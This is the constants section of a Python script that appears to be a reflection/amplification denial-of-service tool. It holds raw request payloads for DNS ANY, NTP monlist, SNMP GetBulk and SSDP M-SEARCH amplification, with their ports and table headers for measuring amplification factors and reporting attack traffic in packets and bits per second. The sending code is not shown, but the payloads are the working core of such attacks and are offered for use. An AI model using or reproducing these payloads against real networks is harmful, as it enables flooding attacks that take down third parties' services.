#!/usr/bin/env python

############################# AMPLIFICATON CONSTANTS ###########################
BENCHMARK = (
    'Protocol'
    '|  IP  Address  '
    '|     Amplification     '
    '|     Domain    '
    '\n{}').format('-' * 75)

ATTACK = (
    '     Sent      '
    '|    Traffic    '
    '|    Packet/s   '
    '|     Bit/s     '
    '\n{}').format('-' * 63)

PORT = {
    'dns': 53,
    'ntp': 123,
    'snmp': 161,
    'ssdp': 1900}

PAYLOAD = {
    'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
            '{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
            '\x00\x00\x00\x00\x00\x00'),
    'snmp': ('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
             '\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
             '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
             '\x01\x02\x01\x05\x00'),
    'ntp': ('\x17\x00\x02\x2a' + '\x00' * 4),
    'ssdp': ('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
             'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}

amplification = {
    'dns': {},
    'ntp': {},
    'snmp': {},
    'ssdp': {}}  # Amplification factor

FILE_NAME = 0  # Index of files names
FILE_HANDLE = 1  # Index of files descriptors

npackets = 0  # Number of packets sent
nbytes = 0  # Number of bytes reflected
files = {}  # Amplifications files

SUFFIX = {
    0: '',
    1: 'K',
    2: 'M',
    3: 'G',
    4: 'T'}
